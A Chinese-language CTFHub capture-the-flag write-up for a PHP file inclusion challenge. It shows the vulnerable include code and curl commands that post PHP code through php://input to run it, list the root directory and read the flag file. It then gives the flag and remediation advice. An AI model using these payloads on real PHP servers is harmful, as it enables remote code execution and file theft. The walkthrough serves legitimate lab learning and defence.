CTFHub - Web - php://input

# CTFHub # Web # 文件包含 # php://input # PHP

一、题目信息

  • 题目名称：php://input
  • 题目方向：Web - 文件包含
  • 运行环境：PHP 5.6.40
  • 题目目标：利用 PHP 输入流包装器执行请求体中的代码，定位并读取 Flag。

二、漏洞分析

访问题目首页后，源码直接暴露了文件包含逻辑：

<?php
if (isset($_GET['file'])) {
    if (substr($_GET["file"], 0, 6) === "php://") {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

代码只允许参数以 php:// 开头，但没有限制具体包装器。服务端 allow_url_include 为 On，因此可以使用 php://input 将 POST 请求体作为 PHP 文件包含并执行。

php://input 是只读输入流，内容为原始请求体；include() 会按 PHP 代码解析该流，因此请求体需要以 <?php 开头。

三、解题步骤

  1. 验证代码执行：向请求体写入 PHP 代码，并让 file 参数指向 php://input。 
    curl.exe -sS -X POST ^
  --data-binary '<?php echo 123; ?>' ^
  "http://<challenge-host>:10800/?file=php://input"
    123
  2. 枚举根目录：使用 PHP 文件系统函数，避免依赖系统命令。 
    curl.exe -sS -X POST ^
  --data-binary '<?php echo json_encode(@scandir("/")); ?>' ^
  "http://<challenge-host>:10800/?file=php://input"

    响应中出现题目生成的 Flag 文件 /flag_10100。

  3. 读取 Flag：使用 file_get_contents() 读取目标文件。 
    curl.exe -sS -X POST ^
  --data-binary '<?php echo file_get_contents("/flag_10100"); ?>' ^
  "http://<challenge-host>:10800/?file=php://input"

四、最终 Flag

ctfhub{fa2603aea441f1b61503ce70}

五、修复建议

  • 禁止用户控制包含目标：使用固定白名单映射，不直接接收或拼接文件路径。
  • 关闭危险配置：生产环境应设置 allow_url_include=Off，避免远程流和输入流被 PHP 解析。
  • 限制包装器：如业务必须使用流包装器，应明确限定协议与路径，而不是只检查字符串前缀。
  • 最小权限：限制 Web 进程读取敏感文件的能力，并将 Flag 等敏感数据移出可访问范围。
  • 关闭源码回显：不要在生产环境通过 highlight_file() 暴露后端源码和实现细节。
